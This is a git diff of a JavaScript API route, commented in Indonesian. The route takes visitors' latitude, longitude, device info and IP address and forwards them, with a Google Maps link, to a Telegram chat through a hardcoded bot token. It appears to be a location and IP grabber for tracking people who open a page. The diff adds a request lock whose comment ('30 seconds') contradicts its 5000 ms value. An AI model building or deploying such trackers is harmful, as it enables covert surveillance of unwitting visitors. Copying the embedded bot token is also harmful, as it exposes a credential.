@@ -12,6 +12,12 @@ const telegramBotToken = '7228539103:AAGMrGW6HA41aKYycNXFo8tCqQp_Z7xjrSA';
 const telegramChatId = '-1002236749350_135'; // ID chat atau grup di Telegram
 const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
+// Cache untuk status penguncian
+let lock = false;
+const lockTimeout = 5000; // 30 detik
+let lockTimestamp = 0;
+
+// Fungsi untuk mengirim pesan ke Telegram
 async function sendToTelegram(message) {
   try {
     await fetch(telegramApiUrl, {
@@ -27,8 +33,30 @@ async function sendToTelegram(message) {
   }
 }
 
+// Fungsi untuk mendapatkan waktu saat ini dalam milidetik
+const getCurrentTime = () => new Date().getTime();
+
 export async function POST(request) {
+  const currentTime = getCurrentTime();
+
   try {
+    // Memeriksa status penguncian
+    if (lock && (currentTime - lockTimestamp < lockTimeout)) {
+      return new Response(JSON.stringify({ status: 'error', message: 'A request is already being processed' }), {
+        status: 429, // Too Many Requests
+        headers: {
+          'Access-Control-Allow-Origin': '*',
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Methods': 'POST, OPTIONS',
+          'Access-Control-Allow-Headers': 'Content-Type',
+        },
+      });
+    }
+
+    // Menyimpan status penguncian
+    lock = true;
+    lockTimestamp = currentTime;
+
     const { latitude, longitude, device_info } = await request.json();
 
     // Mendapatkan alamat IP dari request
@@ -77,6 +105,11 @@ export async function POST(request) {
     // Kirim data terakhir ke Telegram
     const message = `New visit: \nIP Address: ${lastEntry.ip_address} \nLatitude: ${lastEntry.latitude} \nLongitude: ${lastEntry.longitude} \nDevice Info: ${lastEntry.device_info} \nGoogle Maps URL: ${lastEntry.google_maps_url}`;
     await sendToTelegram(message);
+
+    // Reset penguncian setelah timeout
+    setTimeout(() => {
+      lock = false;
+    }, lockTimeout);
 
     return new Response(JSON.stringify({ status: 'success', message: 'Location and device info saved' }), {
       status: 200,
